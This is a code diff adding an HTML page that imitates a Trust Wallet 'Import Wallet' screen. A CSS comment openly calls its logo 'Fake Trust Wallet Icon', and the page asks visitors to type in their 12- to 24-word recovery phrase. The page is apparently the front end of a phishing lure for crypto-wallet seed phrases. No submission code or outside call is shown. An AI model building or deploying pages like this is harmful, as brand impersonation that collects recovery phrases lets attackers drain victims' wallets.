@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Import Wallet</title>
+
+<style>
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0b0f21;
+    color: #fff;
+  }
+
+  .header {
+    text-align: center;
+    padding: 40px 20px 20px;
+  }
+
+  /* Fake Trust Wallet Icon */
+  .logo {
+    width: 70px;
+    height: 70px;
+    background: #1b6ff5;
+    border-radius: 16px;
+    margin: 0 auto 15px;
+    position: relative;
+  }
+  .logo::after {
+    content:"";
+    width: 38px;
+    height: 44px;
+    border: 3px solid #fff;
+    border-radius: 6px;
+    position: absolute;
+    top: 11px;
+    left: 15px;
+  }
+
+  h1 {
+    margin: 0;
+    font-size: 26px;
+    font-weight: 600;
+  }
+
+  .subtitle {
+    color: #9ba3b4;
+    margin-top: 8px;
+    font-size: 14px;
+  }
+
+  .container {
+    padding: 25px;
+  }
+
+  .input-box {
+    margin-top: 25px;
+  }
+
+  textarea {
+    width: 100%;
+    height: 140px;
+    background: #12182b;
+    border: 1px solid #1f2942;
+    border-radius: 12px;
+    padding: 15px;
+    color: #fff;
+    font-size: 15px;
+    outline: none;
+  }
+
+  textarea::placeholder {
+    color: #7383a7;
+  }
+
+  .btn {
+    display: block;
+    width: 100%;
+    background: #1b6ff5;
+    color: #fff;
+    padding: 15px;
+    border: none;
+    border-radius: 12px;
+    margin-top: 25px;
+    font-size: 16px;
+    cursor: pointer;
+    font-weight: 600;
+  }
+
+  .btn:active {
+    opacity: 0.8;
+  }
+
+  .warning {
+    font-size: 12px;
+    color: #9da8c0;
+    margin-top: 15px;
+    line-height: 1.5;
+    text-align: center;
+  }
+
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo"></div>
+  <h1>Import Wallet</h1>
+  <div class="subtitle">Restore your wallet using your Secret Phrase</div>
+</div>
+
+<div class="container">
+
+  <div class="input-box">
+    <textarea placeholder="Enter your 12, 18, or 24-word recovery phrase"></textarea>
+  </div>
+
+  <button class="btn">Import</button>
+
+  <div class="warning">
+    ⚠️ Never share your Secret Phrase.<br>
+    Anyone with your phrase can access your wallet.
+  </div>
+
+</div>
+
+</body>
+</html>
